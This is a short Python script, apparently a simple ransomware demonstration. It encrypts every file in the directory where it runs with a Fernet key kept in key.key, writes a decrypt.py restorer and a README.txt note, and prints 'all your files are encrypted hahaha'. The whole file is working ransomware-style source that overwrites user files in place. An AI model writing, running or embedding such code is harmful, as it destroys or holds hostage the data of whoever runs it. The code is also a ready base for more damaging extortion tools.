import os
from cryptography.fernet import Fernet

files = []
isKey = False

for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

if "key.key" not in files:
    key = Fernet.generate_key()
    with open("key.key", "wb") as encKey:
        encKey.write(key)
else:
    with open("key.key", "rb") as encKey:
        key = encKey.read()
    files.remove("key.key")



for file in files:
    with open(file, "rb") as fileData:
        data = fileData.read()
    encodedData = Fernet(key).encrypt(data)
    with open(file, "wb") as fileData:
        fileData.write(encodedData)
        
with open("decrypt.py", "w") as code:
    code.write(
'''
import os
from cryptography.fernet import Fernet
files = []
with open("key.key", "rb") as encKey:
    key = encKey.read()
for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == "key.key" or file == "README.txt":
        continue
    if os.path.isfile(file):
        files.append(file)
for file in files:
    with open(file, "rb") as fileData:
        data = fileData.read()
    decodedData = Fernet(key).decrypt(data)
    with open(file, "wb") as fileData:
        fileData.write(decodedData)
print("YOUR FILES ARE READY FOR YOU SIR")
'''
    )

with open("README.txt", "w") as read:
    read.write(
'''

HELLO SO IF YOU WANT TO TAKE YOUR FILES BACK JUST OPEN decrypt.py        
        
'''
    )

print("\n\n")
print("all your files are encrypted hahaha")
print("NOW go and read README.txt")
